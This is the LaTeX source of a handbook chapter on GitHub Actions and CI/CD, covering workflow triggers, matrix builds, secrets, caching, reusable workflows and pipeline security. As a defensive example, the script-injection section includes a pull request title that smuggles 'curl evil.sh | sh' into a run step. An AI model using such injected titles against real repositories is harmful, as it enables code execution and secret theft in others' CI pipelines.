\documentclass[11pt]{article}
\usepackage{rabbithole}

\phasenumber{14}
\phasetitle{Actions and CI/CD}
\phasesubtitle{Making the repository do the work, and the two triggers that can hand it to a stranger.}

\hypersetup{pdftitle={Rabbit Holes, Phase 14: Actions and CI/CD},
            pdfauthor={Accelerate, Manipal University Jaipur},
            pdfsubject={git and GitHub handbook}}

\begin{document}
\maketitlepage

\section{What a workflow is}

A YAML file in \co{.github/workflows/} that GitHub runs on a virtual machine when
something happens in the repository.

That is the entire concept. Everything else is detail.

\begin{terminal}
name: CI

on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: pip install -r requirements.txt
      - run: pytest -v
\end{terminal}

\vspace{0.5em}
\begin{tabularx}{\linewidth}{@{}L{2.4cm} X@{}}
\toprule
\rhtablehead{Key} & \rhtablehead{Means} \\
\midrule
\co{on} & What triggers this \\
\co{jobs} & Independent units of work, parallel by default \\
\co{runs-on} & Which virtual machine \\
\co{steps} & Ordered actions inside one job \\
\co{uses} & Run a published action \\
\co{run} & Run a shell command \\
\bottomrule
\end{tabularx}
\vspace{0.5em}

\begin{note}
Each job gets a fresh machine. Two jobs share nothing unless you explicitly pass
data between them with artifacts or outputs. This surprises people who expect job
two to see the files job one built.
\end{note}

\section{Triggers}

\begin{terminal}
on:
  push:
    branches: [main]
    paths: ['src/**', '!**.md']
  pull_request:
    types: [opened, synchronize, reopened]
  schedule:
    - cron: '0 3 * * 1'
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]
  release:
    types: [published]
  issues:
    types: [opened]
\end{terminal}

\co{workflow\_dispatch} adds a Run button in the Actions tab and enables
\co{gh workflow run}. Add it to almost everything, because being unable to re-run a
workflow by hand is annoying at exactly the wrong moment.

\co{paths} avoids running the full test suite when someone fixed a typo in the
README. On a busy repository this saves real time and money.

\section{Matrix builds}

Run the same job across many configurations:

\begin{terminal}
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        python: ["3.10", "3.11", "3.12"]
        exclude:
          - os: windows-latest
            python: "3.10"
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python }}
      - run: pytest
\end{terminal}

Nine combinations minus one exclusion, all in parallel.

\co{fail-fast: false} is worth setting. The default cancels every remaining job as
soon as one fails, which hides whether the failure is on one platform or all of
them, and that is usually the first thing you want to know.

\section{Secrets, variables, permissions}

\begin{shell}
gh secret set API_KEY
gh secret set API_KEY --env production
gh variable set REGION --body "ap-south-1"
gh secret list
\end{shell}

\begin{terminal}
steps:
  - env:
      API_KEY: ${{ secrets.API_KEY }}
      REGION: ${{ vars.REGION }}
    run: ./deploy.sh
\end{terminal}

Secrets are encrypted and masked in logs. Variables are plain text for
non-sensitive configuration.

\begin{trap}
Masking is not security. A workflow that can read a secret can print it in a form
the masker does not catch, for instance base64 encoded or one character at a time.

Which means: \textbf{any code that runs in a workflow with access to your secrets can
exfiltrate them.} That includes every third party action you use and every
dependency they pull. This is the reasoning behind pinning actions, later in this
phase.
\end{trap}

Restrict the automatic token to the minimum:

\begin{terminal}
permissions:
  contents: read
  pull-requests: write
\end{terminal}

Set it at the top of the workflow. The default is often more than a job needs, and
this is the cheapest hardening available.

\section{Caching and artifacts}

Different jobs, frequently confused.

\textbf{Cache} makes future runs faster. It is a performance optimisation and may be
missing:

\begin{terminal}
- uses: actions/cache@v4
  with:
    path: ~/.cache/pip
    key: pip-${{ runner.os }}-${{ hashFiles('requirements.txt') }}
    restore-keys: pip-${{ runner.os }}-
\end{terminal}

Building the key from a hash of the lock file means the cache invalidates exactly
when dependencies change.

\textbf{Artifacts} pass files out of a run, to you or to another job:

\begin{terminal}
- uses: actions/upload-artifact@v4
  with:
    name: handbook-pdfs
    path: handbook/pdf/*.pdf
    retention-days: 30
\end{terminal}

\begin{shell}
gh run download <run-id> --name handbook-pdfs
\end{shell}

\begin{tryit}
This repository's handbook could build itself. A workflow that runs on any change to
\co{handbook/src/}, installs TeX Live, runs \co{python build.py}, and uploads the
PDFs as artifacts means nobody needs LaTeX installed to get current copies.

Add \co{on: release} and it can attach them to the release automatically.
\end{tryit}

\section{Jobs that depend on each other}

\begin{terminal}
jobs:
  test:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.get.outputs.version }}
    steps:
      - id: get
        run: echo "version=1.2.3" >> "$GITHUB_OUTPUT"

  deploy:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: echo "Deploying ${{ needs.test.outputs.version }}"
\end{terminal}

\co{environment: production} is the interesting one. Environments can require manual
approval, restrict which branches may deploy, and hold their own secrets. It is how
you get a human gate in an automated pipeline.

\subsection{Concurrency}

\begin{terminal}
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
\end{terminal}

Pushing three times in a minute otherwise starts three runs. This cancels the older
ones. For deployments, set \co{cancel-in-progress: false} instead, so a deploy is
never interrupted halfway.

\section{Reusing workflows}

\textbf{Reusable workflows} are whole workflows called by others:

\begin{terminal}
on:
  workflow_call:
    inputs:
      python-version:
        type: string
        required: true
    secrets:
      token:
        required: true
\end{terminal}

\begin{terminal}
jobs:
  call:
    uses: accelerate-muj/.github/.github/workflows/test.yml@main
    with:
      python-version: "3.12"
    secrets:
      token: ${{ secrets.MY_TOKEN }}
\end{terminal}

\textbf{Composite actions} bundle several steps into one \co{uses}. Put an
\co{action.yml} in a directory:

\begin{terminal}
name: Setup project
runs:
  using: composite
  steps:
    - uses: actions/setup-python@v5
      with: {python-version: "3.12"}
    - run: pip install -r requirements.txt
      shell: bash
\end{terminal}

Then \co{- uses: ./.github/actions/setup}.

\begin{note}
An organisation-level \co{.github} repository can hold shared workflows for every
repository in the org, which is one more reason the \co{.github} repo exists beyond
the community health files.
\end{note}

\section{Security}

This section matters more than the rest of the phase. CI systems are a favourite
supply chain target because they hold credentials and run other people's code.

\subsection{pull\_request\_target}

\begin{trap}
\co{pull\_request} runs in a restricted context: no secrets, read-only token. That is
correct, because the code in a pull request from a stranger is untrusted.

\co{pull\_request\_target} runs the workflow \textbf{from the base branch} with
\textbf{full secrets and a write token}, while the pull request's code is available
to check out.

If you use \co{pull\_request\_target} and then check out and execute the pull
request's code, you have handed a complete stranger your secrets and write access to
your repository. This is a well known and repeatedly exploited mistake.

Use \co{pull\_request\_target} only for jobs that need write access and never run
contributor code: labelling, commenting, greeting first-time contributors. That is
exactly what this repository's \co{check-poem.yml} does, and it deliberately reads the
changed filenames through the API rather than checking the branch out.

If you must build or test contributor code with secrets, use an environment with
required reviewers so a human approves each run.
\end{trap}

\subsection{Pin your actions}

\begin{terminal}
- uses: actions/checkout@v4
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
\end{terminal}

A tag is a moving pointer, as Phase 10 established, and the owner of an action can
move it. Pinning to a full commit SHA means you run exactly the code you reviewed.

For actions from GitHub itself, a major version tag is a reasonable risk. For
anything else, pin the SHA. Dependabot will keep the pins updated with pull requests
you can review.

\subsection{Script injection}

\begin{trap}
\begin{terminal}
- run: echo "Title: ${{ github.event.pull_request.title }}"
\end{terminal}

The title is attacker controlled. Because \co{\$\{\{ \}\}} is substituted into the
script \emph{before} the shell sees it, a pull request titled
\co{a"; curl evil.sh | sh; \#} becomes a command.

Pass it through the environment instead, where the shell treats it as data:

\begin{terminal}
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
\end{terminal}

The rule: never interpolate \co{\$\{\{ github.event.* \}\}} directly into a
\co{run:} block. Every workflow in this repository follows it.
\end{trap}

\section{Deploying Pages}

\begin{terminal}
permissions:
  contents: read
  pages: write
  id-token: write

jobs:
  deploy:
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: actions/upload-pages-artifact@v3
        with: {path: ./dist}
      - id: deployment
        uses: actions/deploy-pages@v4
\end{terminal}

\co{id-token: write} is required for the deployment to authenticate. Leaving it out
produces an error that does not obviously point at the cause.

\section{Debugging}

\begin{shell}
gh run list --limit 10
gh run view <id> --log-failed
gh run watch <id>
gh run rerun <id> --failed --debug
\end{shell}

Set the repository secrets \co{ACTIONS\_STEP\_DEBUG} and \co{ACTIONS\_RUNNER\_DEBUG}
to \co{true} for much more verbose logs.

For anything more than a small change, test locally with \co{act} rather than pushing
twenty commits called ``fix ci'':

\begin{shell}
act -j test
\end{shell}

\section{Reference}

\vspace{0.5em}
\begin{tabularx}{\linewidth}{@{}L{6.2cm} X@{}}
\toprule
\rhtablehead{Goal} & \rhtablehead{How} \\
\midrule
Manual run button & \co{on: workflow\_dispatch} \\
Skip CI for docs-only changes & \co{on.push.paths} \\
Test several versions & \co{strategy.matrix} \\
See all failures, not the first & \co{fail-fast: false} \\
Speed up dependency installs & \co{actions/cache} \\
Get files out of a run & \co{actions/upload-artifact} \\
Require a human before deploy & \co{environment} with reviewers \\
Cancel superseded runs & \co{concurrency} with \co{cancel-in-progress} \\
Least privilege token & top-level \co{permissions:} block \\
Safe handling of user text & pass via \co{env:}, never inline \\
Only the failing log & \co{gh run view <id> -{}-log-failed} \\
\bottomrule
\end{tabularx}
\vspace{0.5em}

\checkyourself{
\begin{enumerate}
  \item What is the difference between a cache and an artifact?
  \item Why is \co{pull\_request\_target} dangerous, and what is it safe for?
  \item Why pin an action to a SHA rather than a tag? (Phase 10 has the reason.)
  \item Rewrite this safely: \co{run: echo "\$\{\{ github.event.issue.title \}\}"}
  \item Two jobs, and job two cannot see job one's files. Why, and what fixes it?
\end{enumerate}}

\vspace{1em}
{\color{rhborder}\rule{\linewidth}{0.8pt}}

\textbf{Next:} Phase 15, \emph{Being a maintainer}, the longest phase here, and the
one least about commands. It is about running a project other people depend on.

\end{document}
